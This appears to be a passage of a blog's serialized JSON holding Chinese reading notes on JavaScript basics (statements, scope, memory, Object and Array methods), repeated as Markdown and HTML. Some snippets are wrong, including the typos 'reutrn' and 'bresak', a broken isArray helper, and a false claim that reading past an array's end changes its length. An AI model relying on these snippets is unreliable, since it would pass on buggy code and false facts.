每个函数有自己的执行环境，每个执行环境有一个相关联的**变量对象(variable object)**，保存环境中所有的变量和函数\n    - 全局执行环境是最外围的执行环境，在web浏览器中是window对象，所有全局的变量和函数都是作为window的属性和方法\n    - 某个执行环境的所有代码执行完毕后，该环境其中的变量和函数全部销毁\n    - 而全局执行环境在程序退出时销毁，web浏览器中对应关闭网页时\n    - **ECMAScript程序的执行流：**每个函数都有自己的执行环境，当执行流进入一个函数时，函数的环境就被推入一个环境栈中。函数执行后，栈将其环境弹出，把控制权返还给之前的执行环境\n    - **作用域链**，作用域链前端，是当前执行的代码所在环境的变量对象，如果环境是函数，就把函数的**活动对象（activation object）**作为变量对象。活动对象最开始只包含一个变量，即arguments对象（全局环境中不包含），作用域链下一个变量对象来自包含环境，这样一直延续到全局环境。\n    - **延长作用域链**：with和try catch中的catch块可以延长作用域链，即在作用域链的前端临时添加一个变量对象，该变量对象在代码执行完毕后被移除。\n    - 对于catch语句，会创建一个新的变量对象，其中包含对被抛出的错误对象的声明。\n    ```\n    function withLocation(){\n        with(location){\n            var url = href;\n        }\n        reutrn url\n    }\n    // with语句内部，定义了一个url变量，因而url就成了函数执行环境的一部分，所以可以作为函数的值被返回。\n    ```\n   \n    - 标识符解析会沿着作用域链一级一级进行查找，直到找到声明变量的地方，假设局部环境有`var color = \"red\"`,此时在局部环境中只有使用`window.color`才可以访问在全局变量中定义的color\n    - 变量查询有代价会比较慢，所以访问局部变量会比访问全局变量快，但现在差距几乎可以忽略\n    \n7. **垃圾收集**\n    - JS具有自动垃圾收集机制，执行环境会负责管理代码执行过程中使用的内存，即内存分配和无用内存的回收\n    - 这种自动垃圾收集机制的原理是：找出不再使用的变量，然后销毁释放其占用的内存。垃圾收集器会隔段时间就周期性地执行这一操作\n    - 浏览器中对垃圾收集的实现方式包含：引用计数和标记清除两种\n    - **标记清除**：当变量进入环境时（如在函数中声明一个变量）标记为“进入环境”，当变量离开环境时，标记为“离开环境”\n    - **引用计数**：跟踪每个值被引用的次数，当引用次数为0时就在下一次垃圾收集器运行时销毁这个变量。\n    - 当循环引用时，引用计数不能清除变量，会造成内存泄漏\n    - IE9之前版本中部分DOM和BOM对象不是原生JS对象，而是C++实现的COM对象，涉及到COM对象与原生JS对象的相互引用时，即使页面中的BOM对象\\DOM对象从页面移除了，他也不会被回收\n    - 为了避免此类问题，在不使用的时候，手动断开DOM元素与原生JS对象间的连接\n\n8. **管理内存**\n    - 电脑分配给Web浏览器的内存比分给桌面程序的少，以避免浏览器耗尽内存引发系统崩溃\n    - 这个内存限制，会对给变量分配内存造成影响，并影响调用栈以及在一个线程中同时执行的语句数量。\n    - 所以为了获得更好的页面性能，需要注意**优化内存使用**，就是不使用的变量就解除引用，局部变量会在离开执行环境时自动解除引用，所以要注意的就是全局变量不使用时就解除引用。\n\n# 三、引用类型 #\n\n1. **Object类型**\n    - 创建Object实例包含两种方法：`new Object()`和对象字面量`var obj = {}`，使用对象字面量创建对象，不会调用Object构造函数\n    - `var obj = {}`是一个表达式上下文，表达式上下文指的是能够返回一个值；`if(a==b)`是一个语句上下文\n    - 在最后一个属性后面添加逗号，会在一些浏览器中导致错误\n    - 属性名可以是数值，此时会自动转换为数值字符串\n    - 在向函数传递大量可选参数时，最好的做法是对那些必需值使用命名参数，而使用对象字面量来封装多个可选参数\n    - 访问对象属性有两种：点和方括号，方括号的优点是可以通过变量来访问属性`var a = \"name\"; console.log(person[a])`，并且可以兼容比较奇怪的属性名：`person[\"first name\"] = \"Nicholas\";`通常使用点方法访问\n\n2. **Array类型**\n    - 创建Array实例的方式：\n    ```\n    // Array构造函数方式\n    var arr1 = new Array(\"a\",\"b\");\n    var arr2 = Array(\"a\", \"b\");\n    var arr3 = Array(3);        \n\n    // 数组字面量方式\n    var arr4 = [1,2,3];\n\n    var arrFault = [,,,];  //不推荐!\n    var arrFault2 = [1,2,] //不推荐!\n    ```\n    - 在使用数组字面量表示法时，也不会调用 Array 构造函数【？】\n    - 关于length:\n        1. 如果索引值超出length，会自动以undefined补全长度\n    ```\n    var arr=[1,2,3]\n    console.log(arr[5])      //undefined\n    console.log(arr.length)  //5\n    ```\n        2. 可以通过设置length值，修改数组，截短或加长\n    - 检测数组\n        1. instanceof检测法`if(value instanceof Array)`，问题在于它假定只有一个全局执行环境，因为Array是window的属性。如果网页中包含多个frame，那实际上就存在多个window，即两个以上不同的全局执行环境，从而存在两个以上不同版本的 Array 构造函数。如果你从一个框架向另一个框架传入一个数组，那么传入的数组与在第二个框架中原生创建的数组分别具有各自不同的构造函数。\n        2.  ECMAScript 5 新增了 Array.isArray()方法。这个方法的目的是最终确定某个值到底是不是数组，而不管它是在哪个全局执行环境中创建的。兼容性IE9+\n        3.  22.1.1章节中的安全的类型检测的方法，可以解决低版本浏览器的类型检测问题\n        ```\n            function isArray(value){\n                return Object.prototype.toString().call(value)==\"[object Array]\";\n            }\n        ```\n            原理：在任何值上调用 Object 原生的 toString()方法，都会返回一个[object NativeConstructorName]格式的字符串。用来区分是否是JS原生对象，任何开发人员自定义的构造函数都将返回\"[object Object]\"。\n    - 转换方法：toString、toLocaleString返回由每一项调用toString、toLocaleString得到的字符串组成的数组；valueOf返回原数组；arr.join(\"\")拼接数组成字符串\n    - 栈方法（后进先出）与队列方法（先进先出）\n      1. push / pop：数组末尾添加/删除，push可添加多项，返回数组长度；pop移除一项，返回被移除的项\n      2. shift / unshift：在数组前端移除 / 添加一项，shift返回移除的项，unshift可添加多项，返回新数组长度\n      3. shift和pop，都只能移除一项，返回移除的项；unshift和push都可增加多项，并返回新数组长度。\n    - 排序：reverse反序和sort排序\n      1. sort用法\n      ```\n        arr.sort(fun)\n        function fun(a,b){\n            return a-b\n            // 返回负值，a排在前面；返回0，顺序不变；返回正值，a排在后面\n        }\n      ```\n    - 操作方法：concat、slice、splice\n      1. concat参数为数组时，是把每一项添加到原数组中，可以用来给多维数组降维\n      2. slice方法可接受一或两个参数，即要返回项的起始和结束位置，不会影响原始数组，若参数中有一个负数，则用数组长度加上该数来确定相应的位置\n      3. splice最强大的数组方法，可以删除、插入和替换，主要用途是向数组的中部插入项，会改变原数组。返回一个数组，包含从原数组中删除的项（如果没有删除任何项，返回空数组）\n      ```\n      splice(0,2)\n        //删除数组中的前两项\n      splice(2,0,\"red\",\"green\")\n        //从当前数组的位置 2 开始插入字符串\"red\"和\"green\"\n      splice (2,1,\"red\",\"green\")\n        //删除当前数组位置 2 的项，然后再从位置 2 开始插入字符串\"red\"和\"green\"\n      ```\n    - 位置方法：indexOf()和 lastIndexOf()，二者的区别在于，从头查和从尾查，在没查到的情况下返回-1。在比较第一个参数\n与数组中的每一项时，**使用全等（===）操作符**。\n    - 迭代方法：every、filter、forEach、map、some，都不会修改原数组，传入的函数接收三个参数：数组项的值、该项在数组中的位置和数组对象本身。`function(item, index, arr){}`\n      1. every()：对数组中的每一项运行给定函数，若该函数对每一项都返回 true，则返回 true\n      2. filter()：对数组中的每一项运行给定函数，返回该函数会返回true项组成的数组\n      3. forEach()：对数组中的每一项运行给定函数。这个方法没有返回值\n      4. map()：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组\n      5. some()：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true\n    - 归并方法ruduce和reduceRight，迭代数组的所有项，然后构建一个最终返回的值，区别是左起遍历还是右起遍历。传给 reduce()和 reduceRight()的函数接收4参数：前一个值、当前值、项的索引和数组对象。该函数返回的值会作为第一个参数自动传给下一项。第一次迭代发生在数组的第二项上，因此第一个参数是数组的第一项，第二个参数就是数组的第二项。迭代和归并方法是ES5引入的方法，IE9+支持\n    ```\n    var values = [1,2,3,4,5];\n    var sum = values.reduce(function(prev, cur, index, array){\n    return prev + cur;\n    });\n    alert(sum); //15\n    ```\n\n\n---\n> 本文地址：[http://supermaryy.com/2016/09/20/read-book-professional-javascript4](http://supermaryy.com/2016/09/20/read-book-professional-javascript4)\n\nReference：\n\n1. [前端基础进阶（一）：内存空间详细图解](http://www.jianshu.com/p/996671d4dcc4#)\n2. [深入理解javascript之内存分配](http://www.2cto.com/kf/201506/409654.html)\n\n\n\n\n","source":"_posts/read-book-professional-javascript4.md","raw":"---\ntitle: Javascript基础4\ndate: 2016-09-20 22:00:00\ncategories: Javascript\ntags: [Javascript,红皮书,读书笔记] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n摘要：\n\n1. for in 循环如果属性值为null和undefined，ES3报错，ES5终止循环，故使用前需要检测值是否为null和undefined\n2. JS不存在块级作用域，所以for循环中定义的变量，循环外可访问\n3. for in循环实际使用前最好检测值是否为null或者是undefined\n4. label语句，给循环起个名字loopName，需要的时候就可以在循环中用break loopName跳出循环，或者continue loopName，多用在循环嵌套的时候\n5. switch语句使用全等操作符，所以并不会进行数据类型转换，数组的indexOf和laseIndexOf也使用全等操作符\n6. 函数return的例外：遇到try catch语句，如果有finally，即使在try 或catch中写了return，仍然会执行finally里的代码\n7. arguments与数组相似：可以用arguments[n]访问值，有length属性。但没有数组的方法\n\n\n<!-- more -->\n\n\n> by MaryTien from  [http://supermaryy.com](http://luckymona.github.com)\n> 本文地址：[http://supermaryy.com/2016/09/20/read-book-professional-javascript4](http://supermaryy.com/2016/09/20/read-book-professional-javascript4)\n\n# 一、语句 #\n\n1. for会自动调用Boolean()函数，把条件语句，转换成布尔值。\n\n2. for(var i=0; i<3; i++){} 循环中定义的变量i，循环外部也可以访问，因为JS不存在块级作用域\n\n3. **for in循环**可以遍历对象的属性，没有一定的顺序，如果属性值为null和undefined，ES3下会抛出错误，ES5中会中断循环，~~但是实际执行时并没有中断~~，所以实际使用前最好检测值是否为null或者是undefined：\n```\n// 这种写法不会中断：\nvar x;\nvar aa = { \n    bb:null,\n    cc:x,\n    dd:\"1\"\n}\n\nfor(var propName in aa){\nconsole.log(aa[propName]);\n}\n// 结果：null/undefined/1\n\n// 这种写法会中断：\narr = new Array(3); // [undefined × 3]\narr.forEach(()=>console.log('have done'));  // 没有打印，浏览器语句返回值undefined\nfor(var i in arr) console.log('have done'); // 没有打印，浏览器语句返回值undefined\nfor(var i of arr) console.log('have done'); //3次\"have done\"\n```\n\n4. **label 语句**\nlabel语句主要是与for循环配合使用，结合break和continue，可以跳出循环。多用在循环嵌套的时候\n```\n//下面例子结合break，continue同理\noutLoop:\nfor(var i=0; i<4; i++){\n    innerLoop:\n    for(var j=0; j<4; j++){\n        if(i==2 && j==2){\n            break outLoop;\n        }\n        console.log('i:'+i+\",j:\"+j);\n    }\n}\n// 输出值：\n i:0,j:0\n i:0,j:1\n i:0,j:2\n i:1,j:0\n```\n\n5. **with 语句**\n简化对同一个对象的多次操作，如：\n```\nvar obj = {a:'11', b:'22'}；\nobj.a = 'aa';\nobj.b = 'bb';\n\n// 简化后：\nvar obj = {a:'11', b:'22'}；\nwith(obj){\n    var c = \"cc\"\n    a = 'aa';\n    b = 'bb';\n}\n```\nwith代码块形成一个作用域，就是obj。JS解析时，会将with代码块中的所有变量a/b/c当做局部变量，如果局部环境中找不到定义a/b，就从obj的属性中查找，如果找到了就覆盖obj中的变量，如果找不到，就从with所在的外部作用域中找。\n>这意味着在 with 语句的代码块内部，每个变量首先被认为是一个局部变量，而如果在局部环境中找不到该变量的定义，就会查询location 对象中是否有同名的属性。如果发现了同名属性， 则以 location 对象属性的值作为变量的值。这样会导致性能下降，不推荐使用。\n\n6. **switch**\n需要混合的时候，要加注释：\n```\n\nswitch(i){\n    case 12:\n        //合并两种情形\n    case 13:\n        console.log('hhh');\n        break;\n    case 14:\n        console.log('14');\n        bresak;\n}\n```\n据JS精粹这本书，贯穿的时候，每个都写break：\n```\nswitch(i){\n    case 12:\n    case 13:\n        break;\n}\n\n//上面写法易出错，且很难发现，应该这么写\nswitch(i){\n    case 12:\n        break;\n    case 13:\n        break;\n}\n```\n**switch使用的全等操作符，所以并不会进行数据类型转换**\n\n7. **函数**\n\n    - 函数定义时不必指定是否返回值；\n    - 如果加了return，只执行到return语句，后面的永远不会被执行，\n    - 例外：try catch语句，如果有finally，即使在try 或catch中写了return，仍然会执行finally里的代码\n    - 如果return语句不加返回值，默认将返回undefined\n\n8. **参数**\n\n    + arguments可以与命名参数一起使用\n    + arguments与数组相似：可以用arguments[n]来访问值，有length属性。但不是数组，没有数组的方法：slice、splice、shift、unshift、push、pop、concat、join、sort、reverse\n    + arguments的值永远与命名参数的值保持同步，其与命名参数并不是访问相同的内存空间，但是值会同步，没有传递值的；命名参数值默认被赋予undefined\n    + ** 函数所有传参都是按值传递，不可能通过引用传参 **\n    结论：对于数字、字符串等是将它们的值传递给了函数参数，函数参数的改变不会影响函数外部的变量；对于数组和对象等是将对象(数组)变量的值传递给了函数参数，这个值是指向对象(数组)的地址。\n\n    **函数传参的过程是把函数外部的变量的值复制给函数的局部变量，这个局部变量是指arguments的某个值。**\n    这句话对于理解引用类型传参时也是按值传递非常重要，检验是否理解引用类型按值传参的一段代码：\n    ```\n    function setName(obj) {\n        obj.name = 'aaa';\n        var obj = new Object();\n        obj.name = 'ccc';\n        return obj;\n    }\n    var person = new Object();\n    person.name = 'bbb';\n\n    var newPerson = setName(person);\n    console.log(person.name + ' | ' + newPerson.name); // aaa | ccc\n    ```\n\n# 二、变量、作用域和内存问题 #\n\n1. **基本类型和引用类型的值**\n\n    + 定义基本类型值和引用类型值的过程：创建一个变量并为该变量赋值\n    + 基本类型值指的是简单的数据段，而引用类型值指可能有多个值构成的对象\n    + 5种基本数据类型是按值访问的，因为可以操作保存在变量中的实际的值\n    + 引用类型的值是保存在内存中的对象的地址。JavaScript不允许直接访问内存中的位置，也就是说不能直接操作对象的内存空间。\n    + 操作对象时，实际上是在操作对象的引用而不是实际的对象。为此，引用类型的值是按引用访问的\n\n2. **堆栈**\n\n    堆存储：类似书架与书，存取没有顺序，只要知道书的名字，就可以方便的取出想要的书\n    栈存储：类似羽毛球筒与羽毛球，先存后取，后存先取，要拿中间某一个球必须先把它上面的球全拿出来\n\n    栈的优势是存取速度比堆快，缺点是存在栈中的数据大小与生存期必须是确定的，缺乏灵活性。堆的优势是可以动态分配内存大小，生存期也不必事先告诉编译器，垃圾收集器会自动地收走这些不再使用的数据，但是缺点是由于在运行时动态分配内存，所以存取速度较慢。\n\n    基本类型值，一旦赋值，大小就固定了，因此存储在栈内存中。引用类型的值，可以动态的改变，例如定义一个对象之后，还可以给它添加变量和方法，因此大小不固定，所以存储在堆内存中。\n\n    js中的基础类型变量，都是存放在变量对象中，JavaScript属于高级语言，高级语言中严格意义上来说并没有堆栈的区分。但是一些特殊场景会在逻辑上实现栈的存取方式，这才有了堆与栈的不同。\n\n    理解堆栈存储：\n    ```\n    function Person(id,name,age){ \n        this.id = id; \n        this.name = name; \n        this.age = age; \n    } \n    var num = 10; \n    var bol = true; \n    var str = \"abc\"; \n    var obj = new Object(); \n    var arr = ['a','b','c']; \n    var person = new Person(100,\"jxl\",22);\n    ```\n    [stack-pic](http://o798x2hdw.bkt.clouddn.com/stack.png)\n\n3. **赋值变量值**\n\n    + 从一个变量向另一个变量复制基本类型值，会在变量对象上创建一个新值，然后把该值复制到为新变量分配的位置上。\n    + 当复制引用类型的值时，会将原变量的值复制一份放到为新变量分配的空间中。不同的是这个值是一个指针，改变其中一个变量会影响到另一个变量\n    [copy_variable-pic](http://o798x2hdw.bkt.clouddn.com/copy-variable.png)\n\n4. **传递参数**\n\n    - JS中所有参数都是按值传递的\n    - 把函数外部的值复制给函数内部参数，就和把值从一个变量复制到另一个变量一样\n    - 传递引用类型值时传递的是指针，因此在函数中对局部变量参数的修改会反映到函数外部\n    - 可以把函数参数想象成局部变量\n\n5. **检测类型**\n    - 检测基本类型值（number\\string\\undefined\\boolean）用typeof，检测引用类型值用instanceof\n    - 如果是对象或**null**，typeof会返回\"object\"\n    - 如果是function，typeof会返回\"function\"\n    - 如果变量是给定引用类型的实例，instanceof 操作符就会返回 true\n    ```\n    var person = function(){\n      this.name = \"aa\";\n    }\n    var bill  = new person();\n    console.log(bill instanceof person)  //true\n    ```\n    - 用instanceof检测基本类型值，始终返回false，因为基本类型值不是对象\n\n6. **执行环境及作用域**\n    - **执行环境（execution context）**定义了变量或函数有权访问的其他数据\n    - 每个函数有自己的执行环境，每个执行环境有一个相关联的**变量对象(variable object)**，保存环境中所有的变量和函数\n    - 全局执行环境是最外围的执行环境，在web浏览器中是window对象，所有全局的变量和函数都是作为window的属性和方法\n    - 某个执行环境的所有代码执行完毕后，该环境其中的变量和函数全部销毁\n    - 而全局执行环境在程序退出时销毁，web浏览器中对应关闭网页时\n    - **ECMAScript程序的执行流：**每个函数都有自己的执行环境，当执行流进入一个函数时，函数的环境就被推入一个环境栈中。函数执行后，栈将其环境弹出，把控制权返还给之前的执行环境\n    - **作用域链**，作用域链前端，是当前执行的代码所在环境的变量对象，如果环境是函数，就把函数的**活动对象（activation object）**作为变量对象。活动对象最开始只包含一个变量，即arguments对象（全局环境中不包含），作用域链下一个变量对象来自包含环境，这样一直延续到全局环境。\n    - **延长作用域链**：with和try catch中的catch块可以延长作用域链，即在作用域链的前端临时添加一个变量对象，该变量对象在代码执行完毕后被移除。\n    - 对于catch语句，会创建一个新的变量对象，其中包含对被抛出的错误对象的声明。\n    ```\n    function withLocation(){\n        with(location){\n            var url = href;\n        }\n        reutrn url\n    }\n    // with语句内部，定义了一个url变量，因而url就成了函数执行环境的一部分，所以可以作为函数的值被返回。\n    ```\n   \n    - 标识符解析会沿着作用域链一级一级进行查找，直到找到声明变量的地方，假设局部环境有`var color = \"red\"`,此时在局部环境中只有使用`window.color`才可以访问在全局变量中定义的color\n    - 变量查询有代价会比较慢，所以访问局部变量会比访问全局变量快，但现在差距几乎可以忽略\n    \n7. **垃圾收集**\n    - JS具有自动垃圾收集机制，执行环境会负责管理代码执行过程中使用的内存，即内存分配和无用内存的回收\n    - 这种自动垃圾收集机制的原理是：找出不再使用的变量，然后销毁释放其占用的内存。垃圾收集器会隔段时间就周期性地执行这一操作\n    - 浏览器中对垃圾收集的实现方式包含：引用计数和标记清除两种\n    - **标记清除**：当变量进入环境时（如在函数中声明一个变量）标记为“进入环境”，当变量离开环境时，标记为“离开环境”\n    - **引用计数**：跟踪每个值被引用的次数，当引用次数为0时就在下一次垃圾收集器运行时销毁这个变量。\n    - 当循环引用时，引用计数不能清除变量，会造成内存泄漏\n    - IE9之前版本中部分DOM和BOM对象不是原生JS对象，而是C++实现的COM对象，涉及到COM对象与原生JS对象的相互引用时，即使页面中的BOM对象\\DOM对象从页面移除了，他也不会被回收\n    - 为了避免此类问题，在不使用的时候，手动断开DOM元素与原生JS对象间的连接\n\n8. **管理内存**\n    - 电脑分配给Web浏览器的内存比分给桌面程序的少，以避免浏览器耗尽内存引发系统崩溃\n    - 这个内存限制，会对给变量分配内存造成影响，并影响调用栈以及在一个线程中同时执行的语句数量。\n    - 所以为了获得更好的页面性能，需要注意**优化内存使用**，就是不使用的变量就解除引用，局部变量会在离开执行环境时自动解除引用，所以要注意的就是全局变量不使用时就解除引用。\n\n# 三、引用类型 #\n\n1. **Object类型**\n    - 创建Object实例包含两种方法：`new Object()`和对象字面量`var obj = {}`，使用对象字面量创建对象，不会调用Object构造函数\n    - `var obj = {}`是一个表达式上下文，表达式上下文指的是能够返回一个值；`if(a==b)`是一个语句上下文\n    - 在最后一个属性后面添加逗号，会在一些浏览器中导致错误\n    - 属性名可以是数值，此时会自动转换为数值字符串\n    - 在向函数传递大量可选参数时，最好的做法是对那些必需值使用命名参数，而使用对象字面量来封装多个可选参数\n    - 访问对象属性有两种：点和方括号，方括号的优点是可以通过变量来访问属性`var a = \"name\"; console.log(person[a])`，并且可以兼容比较奇怪的属性名：`person[\"first name\"] = \"Nicholas\";`通常使用点方法访问\n\n2. **Array类型**\n    - 创建Array实例的方式：\n    ```\n    // Array构造函数方式\n    var arr1 = new Array(\"a\",\"b\");\n    var arr2 = Array(\"a\", \"b\");\n    var arr3 = Array(3);        \n\n    // 数组字面量方式\n    var arr4 = [1,2,3];\n\n    var arrFault = [,,,];  //不推荐!\n    var arrFault2 = [1,2,] //不推荐!\n    ```\n    - 在使用数组字面量表示法时，也不会调用 Array 构造函数【？】\n    - 关于length:\n        1. 如果索引值超出length，会自动以undefined补全长度\n    ```\n    var arr=[1,2,3]\n    console.log(arr[5])      //undefined\n    console.log(arr.length)  //5\n    ```\n        2. 可以通过设置length值，修改数组，截短或加长\n    - 检测数组\n        1. instanceof检测法`if(value instanceof Array)`，问题在于它假定只有一个全局执行环境，因为Array是window的属性。如果网页中包含多个frame，那实际上就存在多个window，即两个以上不同的全局执行环境，从而存在两个以上不同版本的 Array 构造函数。如果你从一个框架向另一个框架传入一个数组，那么传入的数组与在第二个框架中原生创建的数组分别具有各自不同的构造函数。\n        2.  ECMAScript 5 新增了 Array.isArray()方法。这个方法的目的是最终确定某个值到底是不是数组，而不管它是在哪个全局执行环境中创建的。兼容性IE9+\n        3.  22.1.1章节中的安全的类型检测的方法，可以解决低版本浏览器的类型检测问题\n        ```\n            function isArray(value){\n                return Object.prototype.toString().call(value)==\"[object Array]\";\n            }\n        ```\n            原理：在任何值上调用 Object 原生的 toString()方法，都会返回一个[object NativeConstructorName]格式的字符串。用来区分是否是JS原生对象，任何开发人员自定义的构造函数都将返回\"[object Object]\"。\n    - 转换方法：toString、toLocaleString返回由每一项调用toString、toLocaleString得到的字符串组成的数组；valueOf返回原数组；arr.join(\"\")拼接数组成字符串\n    - 栈方法（后进先出）与队列方法（先进先出）\n      1. push / pop：数组末尾添加/删除，push可添加多项，返回数组长度；pop移除一项，返回被移除的项\n      2. shift / unshift：在数组前端移除 / 添加一项，shift返回移除的项，unshift可添加多项，返回新数组长度\n      3. shift和pop，都只能移除一项，返回移除的项；unshift和push都可增加多项，并返回新数组长度。\n    - 排序：reverse反序和sort排序\n      1. sort用法\n      ```\n        arr.sort(fun)\n        function fun(a,b){\n            return a-b\n            // 返回负值，a排在前面；返回0，顺序不变；返回正值，a排在后面\n        }\n      ```\n    - 操作方法：concat、slice、splice\n      1. concat参数为数组时，是把每一项添加到原数组中，可以用来给多维数组降维\n      2. slice方法可接受一或两个参数，即要返回项的起始和结束位置，不会影响原始数组，若参数中有一个负数，则用数组长度加上该数来确定相应的位置\n      3. splice最强大的数组方法，可以删除、插入和替换，主要用途是向数组的中部插入项，会改变原数组。返回一个数组，包含从原数组中删除的项（如果没有删除任何项，返回空数组）\n      ```\n      splice(0,2)\n        //删除数组中的前两项\n      splice(2,0,\"red\",\"green\")\n        //从当前数组的位置 2 开始插入字符串\"red\"和\"green\"\n      splice (2,1,\"red\",\"green\")\n        //删除当前数组位置 2 的项，然后再从位置 2 开始插入字符串\"red\"和\"green\"\n      ```\n    - 位置方法：indexOf()和 lastIndexOf()，二者的区别在于，从头查和从尾查，在没查到的情况下返回-1。在比较第一个参数\n与数组中的每一项时，**使用全等（===）操作符**。\n    - 迭代方法：every、filter、forEach、map、some，都不会修改原数组，传入的函数接收三个参数：数组项的值、该项在数组中的位置和数组对象本身。`function(item, index, arr){}`\n      1. every()：对数组中的每一项运行给定函数，若该函数对每一项都返回 true，则返回 true\n      2. filter()：对数组中的每一项运行给定函数，返回该函数会返回true项组成的数组\n      3. forEach()：对数组中的每一项运行给定函数。这个方法没有返回值\n      4. map()：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组\n      5. some()：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true\n    - 归并方法ruduce和reduceRight，迭代数组的所有项，然后构建一个最终返回的值，区别是左起遍历还是右起遍历。传给 reduce()和 reduceRight()的函数接收4参数：前一个值、当前值、项的索引和数组对象。该函数返回的值会作为第一个参数自动传给下一项。第一次迭代发生在数组的第二项上，因此第一个参数是数组的第一项，第二个参数就是数组的第二项。迭代和归并方法是ES5引入的方法，IE9+支持\n    ```\n    var values = [1,2,3,4,5];\n    var sum = values.reduce(function(prev, cur, index, array){\n    return prev + cur;\n    });\n    alert(sum); //15\n    ```\n\n\n---\n> 本文地址：[http://supermaryy.com/2016/09/20/read-book-professional-javascript4](http://supermaryy.com/2016/09/20/read-book-professional-javascript4)\n\nReference：\n\n1. [前端基础进阶（一）：内存空间详细图解](http://www.jianshu.com/p/996671d4dcc4#)\n2. [深入理解javascript之内存分配](http://www.2cto.com/kf/201506/409654.html)\n\n\n\n\n","slug":"read-book-professional-javascript4","published":1,"updated":"2018-05-07T10:29:59.601Z","layout":"post","photos":[],"link":"","_id":"cjgw444ex003l8d95knfb0sbb","content":"<p>摘要：</p>\n<ol>\n<li>for in 循环如果属性值为null和undefined，ES3报错，ES5终止循环，故使用前需要检测值是否为null和undefined</li>\n<li>JS不存在块级作用域，所以for循环中定义的变量，循环外可访问</li>\n<li>for in循环实际使用前最好检测值是否为null或者是undefined</li>\n<li>label语句，给循环起个名字loopName，需要的时候就可以在循环中用break loopName跳出循环，或者continue loopName，多用在循环嵌套的时候</li>\n<li>switch语句使用全等操作符，所以并不会进行数据类型转换，数组的indexOf和laseIndexOf也使用全等操作符</li>\n<li>函数return的例外：遇到try catch语句，如果有finally，即使在try 或catch中写了return，仍然会执行finally里的代码</li>\n<li>arguments与数组相似：可以用arguments[n]访问值，有length属性。但没有数组的方法</li>\n</ol>\n<a id=\"more\"></a>\n<blockquote>\n<p>by MaryTien from  <a href=\"http://luckymona.github.com\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com</a><br>本文地址：<a href=\"http://supermaryy.com/2016/09/20/read-book-professional-javascript4\">http://supermaryy.com/2016/09/20/read-book-professional-javascript4</a></p>\n</blockquote>\n<h1 id=\"一、语句\"><a href=\"#一、语句\" class=\"headerlink\" title=\"一、语句\"></a>一、语句</h1><ol>\n<li><p>for会自动调用Boolean()函数，把条件语句，转换成布尔值。</p>\n</li>\n<li><p>for(var i=0; i&lt;3; i++){} 循环中定义的变量i，循环外部也可以访问，因为JS不存在块级作用域</p>\n</li>\n<li><p><strong>for in循环</strong>可以遍历对象的属性，没有一定的顺序，如果属性值为null和undefined，ES3下会抛出错误，ES5中会中断循环，<del>但是实际执行时并没有中断</del>，所以实际使用前最好检测值是否为null或者是undefined：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 这种写法不会中断：</span><br><span class=\"line\">var x;</span><br><span class=\"line\">var aa = &#123; </span><br><span class=\"line\">    bb:null,</span><br><span class=\"line\">    cc:x,</span><br><span class=\"line\">    dd:&quot;1&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">for(var propName in aa)&#123;</span><br><span class=\"line\">console.log(aa[propName]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// 结果：null/undefined/1</span><br><span class=\"line\"></span><br><span class=\"line\">// 这种写法会中断：</span><br><span class=\"line\">arr = new Array(3); // [undefined × 3]</span><br><span class=\"line\">arr.forEach(()=&gt;console.log(&apos;have done&apos;));  // 没有打印，浏览器语句返回值undefined</span><br><span class=\"line\">for(var i in arr) console.log(&apos;have done&apos;); // 没有打印，浏览器语句返回值undefined</span><br><span class=\"line\">for(var i of arr) console.log(&apos;have done&apos;); //3次&quot;have done&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>label 语句</strong><br>label语句主要是与for循环配合使用，结合break和continue，可以跳出循环。多用在循环嵌套的时候</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//下面例子结合break，continue同理</span><br><span class=\"line\">outLoop:</span><br><span class=\"line\">for(var i=0; i&lt;4; i++)&#123;</span><br><span class=\"line\">    innerLoop:</span><br><span class=\"line\">    for(var j=0; j&lt;4; j++)&#123;</span><br><span class=\"line\">        if(i==2 &amp;&amp; j==2)&#123;</span><br><span class=\"line\">            break outLoop;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        console.log(&apos;i:&apos;+i+&quot;,j:&quot;+j);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// 输出值：</span><br><span class=\"line\"> i:0,j:0</span><br><span class=\"line\"> i:0,j:1</span><br><span class=\"line\"> i:0,j:2</span><br><span class=\"line\"> i:1,j:0</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>with 语句</strong><br>简化对同一个对象的多次操作，如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span 